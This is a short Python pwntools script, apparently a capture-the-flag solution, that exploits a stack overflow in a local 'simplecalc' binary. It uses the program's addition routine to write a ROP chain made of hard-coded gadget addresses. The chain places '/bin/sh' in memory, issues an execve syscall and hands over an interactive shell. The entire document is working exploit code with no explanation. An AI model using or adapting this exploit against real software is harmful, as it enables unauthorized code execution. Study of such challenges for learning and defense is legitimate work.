#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF("/tmp/simplecalc", checksec=False)
#libc = ELF("/tmp/fmstrs/libc.so.6", checksec=False)
p = process()

def ropper(a):
    p.sendlineafter(b"=> ", b"2")
    x = a + 40
    y = 40
    p.sendlineafter(b"Integer x: ", str(x).encode())
    p.sendlineafter(b"Integer y: ", str(y).encode())

def ropper_full(a):
    ropper(a & 0xffffffff)
    ropper(a>>32 & 0xffffffff)

stack_padding = 9
stack_line = stack_padding*2 + 30 
p.sendlineafter(b"Expected number of calculations: ", str(stack_line).encode())

syscall = 0x0000000000400488
pop_rdi = 0x0000000000401b73
pop_rsi = 0x0000000000401c87
pop_rdx = 0x0000000000437a85
pop_rax = 0x000000000044db34
mov_rax_addr_rdx = 0x000000000044526e
bss_addr = 0x6c5300

#padding
for i in range(stack_padding):
    ropper_full(0)

#/bin/sh
ropper_full(pop_rax)
ropper_full(bss_addr)
ropper_full(pop_rdx)
ropper_full(29400045130965551)
ropper_full(mov_rax_addr_rdx)

#/execve
ropper_full(pop_rax)
ropper_full(0x3b)
ropper_full(pop_rdi)
ropper_full(bss_addr)
ropper_full(pop_rsi)
ropper_full(0)
ropper_full(pop_rdx)
ropper_full(0)
ropper_full(syscall)

p.sendlineafter(b"=> ", b"5")
p.interactive()
